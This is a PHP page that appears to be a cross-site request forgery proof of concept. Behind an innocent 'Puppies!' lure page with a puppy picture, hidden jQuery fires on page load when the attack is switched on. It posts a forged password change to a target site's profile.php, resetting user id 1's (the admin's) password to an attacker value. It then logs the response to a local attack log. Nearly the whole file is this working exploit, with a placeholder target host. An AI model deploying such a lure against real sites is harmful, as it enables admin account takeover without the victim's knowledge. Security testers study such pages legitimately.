<?php
    // Attack parameters:
    $active = false;
    $host = 'http://<target>';
    $target_userid = 1;
    $newadminpassword = 'MYadminGOTowned';
?>
<html>
<head>
	<title>Puppies</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="stylesheet" type="text/css" href="style.css"/>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
</head>
<body>
    <h1><?= "Puppies!" ?></h1>
    <div class="maindiv">
        <p>Look how cute this little puppy is!</p>
    </div>
    <img style="margin-top: 20px" src="Apuppy.jpg"/>
    <br><br>
    <a href="index.php">Back to homepage</a>
    <br>
<?  if ($active) { ?>
    <script>		
		$(document).ready(function(){
            console.log("puppies away!");
			$.ajax({
				url: "<?=$host?>/modules/profile/profile.php?submit=yes",
				type: "post",
				data: { 
                        userid: <?=$target_userid?>,
                        password_form: "<?=$newadminpassword?>", 
				        password_form1: "<?=$newadminpassword?>",
				},
				success: function(response){
					console.log("puppies reached their destination");
					// log successful attack
                    $.ajax({
                        url: "logattacks.php",
                        type: "post",
                        data:{
                            attack: "csrf_on_adminpassword",
                            result: response
                        }
                    });
				}
			});
		});
	</script>
<?  } ?>
</body>
</html>